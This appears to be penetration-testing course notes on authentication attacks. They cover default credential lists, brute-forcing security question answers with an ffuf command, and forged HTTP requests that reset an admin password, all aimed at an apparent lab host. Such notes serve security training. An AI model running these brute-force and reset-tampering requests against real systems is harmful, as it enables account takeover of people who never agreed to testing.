# Default Credentials
Many web applications are set up with default credentials to allow accessing it after installation.

[Testing for Default Credentials](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials) is an essential part of authentication testing in OWASP's Web Application Security Testing Guide. According to OWASP, common default credentials include `admin` and `password`.
## Testing Default Credentials
Many platforms provide lists of default credentials for a wide variety of web applications. Such an example is the web database maintained by [CIRT.net](https://www.cirt.net/passwords). For instance, if we identified a Cisco device during a penetration test, we can search the database for default credentials for Cisco devices:

Further resources include [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub repository which contains a list of default passwords for a variety of different vendors.

We can also try to search for default credentials by searching something like `bookstack default credentials` on Google:

# Vulnerable Password Reset
## Guessable Password Reset Questions
Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions.

Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. Often, the weak link in a question-based password reset functionality is the predictability of the answers. It is common to find questions like the following:

- "`What is your mother's maiden name?`"
- "`What city were you born in?`"

While these questions seem tied to the individual user, they can often be obtained through `OSINT`.

For instance, assuming a web application uses a security question like `What city were you born in?`.

We can attempt to brute-force the answer to this question by using a proper wordlist. For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world.

Since the CSV file contains the city name in the first field, we can create our wordlist containing only the city name on each line using the following command:
```bash
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:
```bash
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

Then we can setup an `ffuf` command to brute-force the answer:
```bash
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```
## Manipulating the Reset Request
When a user can manipulate a potentially hidden parameter to reset the password of a different account.

Supplying an answer to a security prompt may look like this:
```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

We can try to change the request to directly just skip the prompt and change the password:
```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```
